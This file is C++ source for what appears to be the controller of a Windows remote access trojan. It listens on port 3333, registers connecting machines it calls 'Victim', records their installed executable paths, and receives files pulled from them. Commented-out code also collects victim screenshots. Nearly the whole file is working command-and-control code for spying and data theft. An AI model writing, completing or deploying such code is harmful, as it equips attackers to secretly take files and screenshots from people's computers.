#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include "Controller.h" 
#include <windows.h>
#include <stdio.h>
#include <winsock.h>
#include "screenshot.h"


connectedClient::connectedClient(char* setName, char* setIp, unsigned int setClientId)
{

	this->name = setName;
	this->ipAddress = setIp;
	this->id = setClientId;
};

void __cdecl connectedClient::setIsActive(char isActiveBool)
{

	this->isActive = isActiveBool;
};

//-----------------------------------------------------------------------------------------------

void __cdecl sendInfoToClient(unsigned int clientId, char* byteBuffer, int size)
{

	send(clientId, byteBuffer, size, NULL);
	Sleep(10);
	return;
};


void  __cdecl outputColor(int colorCode)
{

	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), colorCode);
	return;
};

void __cdecl Controller::recvThings(connectedClient newClient, std::vector<connectedClient>* _allConnectedClients)
{
	char byteBuffer[MAX_BUF] = "\0";
	zeroBuffer(byteBuffer, MAX_BUF);
	std::string stringBuffer;
	
	while (1)
	{
		//std::cout << "Victim IP: " << newClient.ipAddress << std::endl;
		int recievedBytes = recv(newClient.id, byteBuffer, MAX_BUF, NULL);
		
		if (recievedBytes == NULL || recievedBytes == SOCKET_ERROR)
		{
			int i = 0;
			for (auto& cClient : *_allConnectedClients)
			{
				if (cClient.id == newClient.id)
				{

					_allConnectedClients->erase(_allConnectedClients->begin() + i);

					outputColor(0xC);
					std::cout << "Victim IP: " << newClient.ipAddress << " has disconnected, Victim: " << i << std::endl;
					outputColor(0x7);
					std::cout << ">>> ";
				};
				i++;
			};
			break;
		}
		else
		{
			
			int currentVectorPos;
			for (unsigned int i = 0; i <= _allConnectedClients->size() - 1; i++)
			{
				if ((*_allConnectedClients)[i].ipAddress == newClient.ipAddress && (*_allConnectedClients)[i].id == newClient.id)
				{

					currentVectorPos = i;
				};
			};
			if ((*_allConnectedClients)[currentVectorPos].isActive == 1)
			{
				
				//--Do other things to the bytes. like can make it interpret stuff for file transfer etc.
				stringBuffer=std::string(byteBuffer, recievedBytes);
				char c = stringBuffer.c_str()[0];

				stringBuffer = stringBuffer.substr(1);

				switch (c)
				{
				case text:
				{
				std::string t;
				t = std::string(byteBuffer, recievedBytes);
				std::string substr = "executable_path:";//for exe path
				size_t pos = t.find(substr);
				if (pos != std::string::npos) {
					t.erase(pos, substr.length());//1 for  text enum prepended in client side
					pos = t.find(".exe");
					if (pos != std::string::npos) {
						t = t.substr(0, pos + 4);  // extract the substring up to the end of the ".exe" substring
					}
					(*_allConnectedClients)[currentVectorPos].installed_exe_path = t.substr(1);
					continue;
				}
					std::cout << "\b\b\b\b" << stringBuffer << std::endl;
					break;
				};
				case file:
				{
					bool not_end_msg = true;
					std::ofstream outStream(stringBuffer, std::ios::binary);//first chunk is written
					//std::cout << "file is received\n";
					int counter = 0;

					while (not_end_msg)
					{
						
						char* buf = new char[MAX_BUF];
						zeroBuffer(buf, MAX_BUF);

						int fileByteLength = recv(newClient.id, buf, MAX_BUF, NULL);
						//std::cout << "\nchunk_length :" << fileByteLength << std::endl;
						counter++;
						outStream.write(buf, fileByteLength);
						if (fileByteLength == SOCKET_ERROR)
						{
							std::cout << "socket error\n";
							// Handle the error here
							break;
						}


						// Check if the received data contains the unique string "end"
						std::string received_data(buf, fileByteLength);
						if (received_data.find("end") != std::string::npos)
						{
							not_end_msg = true;
							std::cout << "\nfinished.\n";
							delete[] buf;
							break;
						}


						//if (std::string(buf).find('end') != std::string::npos)
						//{
						//	std::cout << "\nnewline character found\n";
						//	delete[] buf;
						//	break;
						//}

						//if (fileByteLength < MAX_BUF)
						//{
						//	std::cout << "\nfile finshed\n";
						//	delete[] buf;
						//	break;
						//};
						std::cout << "getting file chunk #NO. :" << counter;
						
						delete[] buf;
					};

					outStream.close();
					break;
				};

				default:
				{

					break;
				};
				};
			};
			
		};
	};
};

void __cdecl Controller::listenForClients(int listeningServerSocket, unsigned int* _socketPort, std::string* _ipv4ADDR, std::vector<connectedClient>* _allConnectedClients, std::vector<std::thread>* _threads)
{
	
	
	sockaddr_in socketAddress;
	socketAddress.sin_family = AF_INET;
	socketAddress.sin_port = htons(3333);
	//socketAddress.sin_addr.s_addr = inet_addr("192.168.1.107");
	socketAddress.sin_addr.s_addr = inet_addr("192.168.1.107"); 
	memset(&socketAddress.sin_zero, 0, 8);

	//inet_pton(AF_INET, _ipv4ADDR->c_str(), &socketAddress.sin_addr);
	if (bind(listeningServerSocket, (sockaddr*)&socketAddress, sizeof(socketAddress)) == -1) {
			perror("bind");
			int error = errno;
			socklen_t error_size = sizeof(error);
			if (getsockopt(listeningServerSocket, SOL_SOCKET, SO_ERROR, (char*)&error, &error_size) == -1) {
				std::cerr << "Failed to get socket error\n";
			}
			else {
				std::cerr << "Failed to bind socket: " << strerror(error) << '\n';
			}
			
	
		//std::cerr << "Failed to bind socket: " << std::strerror(errno) << std::endl;
		// Handle the error here, e.g. by exiting the loop or retrying
	}
	if (listen(listeningServerSocket, SOMAXCONN) == -1) {
		std::cerr << "Failed to listen on socket: " << std::strerror(errno) << std::endl;
	}
	while (1)
	{
		//-- Two colons to fix multithreading wackiness
		/*::bind(listeningServerSocket, (sockaddr*)&socketAddress, sizeof(socketAddress));
		listen(listeningServerSocket, SOMAXCONN);*/


		sockaddr_in clientSocketAddress;
		int clientSocketSize = sizeof(clientSocketAddress);

		int clientId = accept(listeningServerSocket, (sockaddr*)&clientSocketAddress, &clientSocketSize);
		if (clientId == -1) {
			std::cerr << "Failed to accept new connection: " << std::strerror(errno) << std::endl;
		}
		char computerName[216], clientIp[216], serverPort[216];

		zeroBuffer(computerName, 216);
		zeroBuffer(clientIp, 216);
		zeroBuffer(serverPort, 216);

		char nameInformation = getnameinfo((sockaddr*)&clientSocketAddress, sizeof(clientSocketAddress), computerName, NI_MAXHOST, serverPort, NI_MAXSERV, NULL);
		inet_ntop(AF_INET, &clientSocketAddress.sin_addr, clientIp, NI_MAXHOST);
		if (WSAGetLastError() == 10047)
		{

			exit(1);
		};
		if (nameInformation == 0)
		{

			outputColor(0xA);

			std::cout << "\n" << "[ " << " IP: " << clientIp << " | Port: " << ntohs(clientSocketAddress.sin_port) << " ]" << std::endl; 
			outputColor(0x7);

			connectedClient newClient(computerName, clientIp, clientId);

			_allConnectedClients->push_back(newClient);

			_threads->push_back(std::thread(recvThings, newClient, _allConnectedClients));

			std::cout << "->>> ";
		}
		else
		{
			outputColor(0xA);
			std::cout << "\n" << "[ " << " IP: " << clientIp << " | Port: " << ntohs(clientSocketAddress.sin_port) << " ]" << std::endl; 
			outputColor(0x7);
		};
	};
};


		//		case '1': //image
		//		{
		//			std::string buffer;
		//			std::string width = "0";
		//			std::string height = "0";
		//			int total = recievedBytes;
		//			//std::cout << "total buffer size  = " << std::to_string(recievedBytes) << std::endl;
		//			// form of respone ==> wdith:height:buffer
		//		//std::string t;
		//		//	t = std::string(stringBuffer, recievedBytes);
		//			size_t widthpos = stringBuffer.find(":");
		//			if (widthpos != std::string::npos) {
		//				width = stringBuffer.substr(0, widthpos);
		//			}
		//			size_t heightpos = stringBuffer.find(":", widthpos + 1);
		//			if (heightpos != std::string::npos) {
		//				height = stringBuffer.substr(widthpos + 1, heightpos - widthpos - 1);
		//			}
		//			buffer = stringBuffer.substr(heightpos + 1);//remove last ":" and save into buffer
		//			std::vector<char> buf_vec(buffer.begin(), buffer.end());
		//			while (1)
		//			{
		//				char* buf = new char[MAX_BUF];
		//				zeroBuffer(buf, MAX_BUF);
		//				int readByteLength = recv(newClient.id, buf, MAX_BUF, NULL);
		//				buf_vec.insert(buf_vec.end(), buf, buf + readByteLength);

		//				if (readByteLength < MAX_BUF)
		//				{

		//					delete[] buf;
		//					break;
		//				};


		//				delete[] buf;
		//			}
		//			//	std::cout << "total image size  = " << std::to_string(buf_vec.size()) << std::endl;
		//				//const char* filename = "results/screenshot.bmp";
		//			if (SaveScreenshotToFile("screenshot.bmp", buf_vec, std::stoi(width), std::stoi(height)))
		//			{
		//				outputColor(0xA);
		//				std::cout << "[+] operation done successfully" << std::endl;
		//				outputColor(0x7);
		//			}
		//			break;


		//			/*int bytes_received = 0;
		//std::vector<char> bufff(MAX_BUF);
		//zeroBuffer(bufff.data(), MAX_BUF);
		//while ((bytes_received = recv(newClient.id, bufff.data(), MAX_BUF, 0)) > 0) {
		//	buf_vec.insert(buf_vec.end(), bufff.begin(), bufff.begin() + bytes_received);
		//	total += bytes_received;
		//	std::cout << "total buffer size  = " << std::to_string(total) << std::endl;
		//}*/
		//		};